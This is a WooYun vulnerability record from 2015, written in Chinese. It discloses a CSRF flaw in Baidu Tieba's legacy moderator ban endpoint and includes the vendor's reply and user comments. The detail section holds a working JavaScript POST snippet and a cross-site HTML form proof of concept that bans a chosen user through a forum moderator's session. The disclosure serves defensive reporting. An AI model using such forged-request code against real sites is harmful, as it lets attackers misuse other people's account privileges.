{"id": 30191, "wybug_id": "wooyun-2015-0117218", "wybug_title": "百度贴吧封禁吧友csrf", "wybug_corp": "百度", "wybug_author": "昌维", "wybug_date": "2015-06-01 12:37", "wybug_open_date": "2015-07-16 14:58", "wybug_type": "CSRF", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["漏洞利用", "利用技巧", "利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-16：\t细节向公众公开  简要描述： 通过csrf借助吧主权限封禁吧友 详细说明：  首先“http://tieba.baidu.com/bawu/cm”这是老版本的吧务后台封禁接口，百度虽然早已改换为新版吧务后台，但是老版本的各种接口依然可以正常使用，由于老程序员的安全意识薄弱，导致虽然新版本的吧务后台看似csrf都做得不错，但是老版本的吧务后台依然可以正常调用里面的接口。\nvar c={ie:\"utf-8\",fid:PageData.forum.forum_id,\"user_name\":prompt(\"用户名\"),ban_days:prompt(\"时长\",1),word:PageData.forum.forum_name,cm:\"filter_forum_user\"};$.post(\"http://tieba.baidu.com/bawu/cm \",c,function(o){if(o.error.errmsg==\"\"){alert(\"封禁成功\");}else{alert(\"封禁失败:\"+o.error.errmsg);}},\"json\");void 0\n可以看出封禁需要向http://tieba.baidu.com/bawu/cm这个地址post如下几个参数即可。\nie:utf-8fid:15309user_name:昌维001ban_days:1word:itcm:filter_forum_user\n\n\n其中fid为贴吧id，可以打开目标贴吧之后在f12的js控制点里面使用PageData.forum.forum_id命令获取，word为目标贴吧名称，ban_days为封禁天数，cm为固定的filter_forum_user，user_name为要封禁的人的id，可以看出并没有进行csrf防御用的tbs参数。具体证明看下面。   漏洞证明：  \n\n\n\n\n\n\n<form action=\"http://tieba.baidu.com/bawu/cm\" method=\"post\">  <p>    ie：      <input name=\"ie\" type=\"text\" id=\"ie\" value=\"utf-8\" />  </p>  <p>fid：    <input name=\"fid\" type=\"text\" id=\"fid\" value=\"15309\" />  </p>  <p>user_name：    <input name=\"user_name\" type=\"text\" id=\"user_name\" value=\"昌维001\" />  </p>  <p>ban_days:    <input name=\"ban_days\" type=\"text\" id=\"ban_days\" value=\"1\" />  </p>  <p>word：    <input name=\"word\" type=\"text\" id=\"word\" value=\"it\" />  </p>  cm：  <input name=\"cm\" type=\"text\" id=\"cm\" value=\"filter_forum_user\" />  <p>    <input type=\"submit\" name=\"button\" id=\"button\" />  by 昌维 </p></form>\n如图所示，使用那个html可以在外域成功提交   修复方案：  要么把老接口都停用要么就加tbs吧。   版权声明：转载请注明来源 昌维@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2015-06-01 14:57 厂商回复： 感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-03 08:01 |    \t\tMo_ \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | Mo_梦)\t\t \n  这个洞被利用了吧！    \n     2015-08-03 10:15 |    \t\t昌维 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | QQ：867597730，百度贴吧ID：昌维001)\t\t \n  @Mo_ 嗯，我自己在吧主专区都被封了    \n     2015-08-03 10:33 |    \t\tMieless \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:1        | 我是来打酱油的。)\t\t \n  @昌维 代码改了点吧，百度真坑爹，没修复好    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}